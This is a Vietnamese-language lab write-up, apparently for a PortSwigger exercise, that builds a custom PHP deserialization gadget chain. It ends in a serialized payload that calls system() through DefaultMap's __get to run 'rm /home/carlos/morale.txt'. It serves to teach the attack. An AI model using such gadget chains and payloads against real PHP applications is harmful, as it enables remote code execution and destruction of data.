## Developing a custom gadget chain for PHP deserialization

1. Bài này yêu cầu tự custom gadget để rce để có thể xóa file trong thư mục người dùng.
2. Để tạo gadget chain thì phải có source code.
3. Từ hint của bài tìm thấy endpoint nghi ngờ trong source + kết hợp `~` - dấu vết file backup trên endpoint đó.

<img width="738" height="926" alt="image" src="https://github.com/user-attachments/assets/ad74e213-adca-41e9-ac7f-b7ecfce119fe" />

<img width="1052" height="453" alt="image" src="https://github.com/user-attachments/assets/16b2de09-2f53-4753-8855-24f2234e399f" />

4. Từ đó biết được đoạn xử lý các obj trong proj.

```
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

5. Bắt đầu từ sink - nơi trực tiếp có thể thực thi command. Đó là hàm `call_user_func` trong phương thức `__get` của class `DefaultMap` khi mà hàm này được sử dụng để gọi một hàm được user define hoặc method của một class một cách dynamic. Nó lấy callable như first argument và các param sau là param của callable.
6. Ví dụ cho dễ hiểu.

```
<?php
function greet($name) {
    echo "Hello, " . $name . "!\n";
}

call_user_func('greet', 'Alice'); // Output: Hello, Alice!
?>
```

7. Như vậy có thể rce bằng cách ví dụ  `call_user_func("system", "whoami")`
8. Để truyền vào 2 tham số như thế kia thì phải gọi 2 magic method trong ``DefaultMap``.
9. Để giá trị callback hay first argument của hàm `call_user_func` là `system` thì chỉ cần truyền khi khai báo Object DefaultMap ~ `new DefaultMap('system')`
10. Để gọi hàm `__get` của class DefaultMap thì phải gọi một không tồn tại hoặc không thể truy cập (private/protected) từ bên ngoài đối tượng. -> Vậy nên không thể chơi kiểu `O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";s:4:"name";s:26:"rm /home/carlos/morale.txt";}` vì chỉ đơn giản là được tạo ra và tồn tại trong bộ nhớ. Không có đoạn mã nào cố gắng truy cập thuộc tính không tồn tại của nó vậy nên `__get` không dược gọi.
11. Như vậy phải dựa vào các class trên.
12. Ta thấy class `Product` có hàm `__construct` cho phép truyền vào 2 param. Và ở chỗ gán `$desc->$default_desc_type;` nhận thấy rằng cố gắng gọi một thuộc tính hoặc method được gán với $default_desc_type từ $desc.
13. Như vậy nếu gán được $desc thành obj DefaultMap và $default_desc_type là một thuộc tính không tồn tại trong DefaultMap thì __get sẽ được gọi với $name = $default_desc_type
14. DO đó tạo chuỗi gadget từ CustomTemplate -> gọi tới __wakeup -> build_product() -> tạo ra một đối tượng Product mới: new Product($this->default_desc_type, $this->desc)
15. Object sau khi serialize sẽ có dạng như sau:

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}}
```

<img width="1066" height="566" alt="image" src="https://github.com/user-attachments/assets/89943949-e4f2-4f03-8ab9-9eca6af127ac" />
